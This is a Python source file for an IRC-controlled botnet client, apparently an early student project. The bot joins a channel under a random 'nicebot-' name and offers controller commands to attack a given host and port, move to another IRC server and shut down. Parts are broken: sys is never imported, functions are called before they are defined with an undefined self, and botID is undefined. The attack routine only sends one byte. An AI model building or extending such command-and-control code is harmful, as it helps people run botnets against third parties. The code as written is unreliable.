import random, socket

HOST = ""
PORT = -1
NICK = ""
PASS = ""
CHAN = ""

BUF_SIZE = 1024

botName = ""
username = ""
secret = ""

s = None #replace with whatever the IRC is going to be on

#arguments hostname port channel secret-phrase
if __name__ == '__main__':
	HOST = sys.argv[1]
	PORT = sys.argv[2]
	CHAN = "#" + sys.argv[3]
	secret = sys.argv[4]
	startConn(self)

def startConn(self):
	self.s = socket.socket()
	self.s.connect((HOST, PORT))
	
	#login to IRC
	#s.send("PASS %s\r\n" % (PASS))
	#not needed as apparently there are no usernames/pws required
	
	
	self.s.send("USER %s %s %s:%s\r\n" % (botName, botName, botName, botName))
	while 1:
		#generate botName
		botNum = ''.join(random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range (6))
		botName = "nicebot-" + botNum
		self.s.send("NICK %s \r\n" % (botName))
		
		prefix, command, args = parsemsg(self.s.recv(1024).decode("utf-8"))
		if command != "433":
			break
		
	self.s.send("JOIN %s\r\n" % (CHAN))
	
def parsecmd(self, command, *args):
	if command == "status":
		status(self)
	elif command == "attack":
		attack(self, args[0], args[1])
	elif command == "move":
		move(self, args[0], args[1], args[2])
	elif command == "shutdown":
		shutdown(self)
	
#from carlos' twitch IRC bot, idk if it works with other IRCs
def parsemsg(s):
    """Breaks a message from an IRC server into its prefix, command, and arguments.
    """
    prefix = ''
    trailing = []
    if not s:
       raise IRCBadMessage("Empty line.")
    if s[0] == ':':
        prefix, s = s[1:].split(' ', 1)
    if s.find(' :') != -1:
        s, trailing = s.split(' :', 1)
        args = s.split()
        args.append(trailing)
    else:
        args = s.split()
    command = args.pop(0)
    
    # parsemsg(":test!~test@test.com PRIVMSG #channel :Hi!")
	# ('test!~test@test.com', 'PRIVMSG', ['#channel', 'Hi!']) 
    
    return prefix, command, args
    
def status(self):
	msg = botID
	#private message controller

def attack(self, atkhost, atkport):
	atkmsg = "1"
	success = False
	try:
		atkSock = socket.socket()
		atkSock.connect((atkhost, atkport))
		atkSock.send(atkmsg)
		atkSock.close()
		success = True
	except:
		print("attack failed")
	
	#report back to controller
	
def move(self, newhost, newport, newchan):
	success = False
	self.s.close()
	self.s = socket.socket() #This line probably isn't needed
	try:
		self.s.connect((newhost, newport))
	
		#join IRC
		self.s.send("NICK %s \r\n" % (botName))
		self.s.send("JOIN %s\r\n" % (newchan))
	except:
		print("failed to move to new channel") # we may want to handle a few more specific errors, this is general for now
		
	#if failure, keep trying? or maybe stay on old IRC?

def shutdown(self):
	shutdownmsg = botID + " disconnected" #needs to be formatted properly for a private message
	self.s.send(shutdownmsg)
	sys.exit(0)
	
	
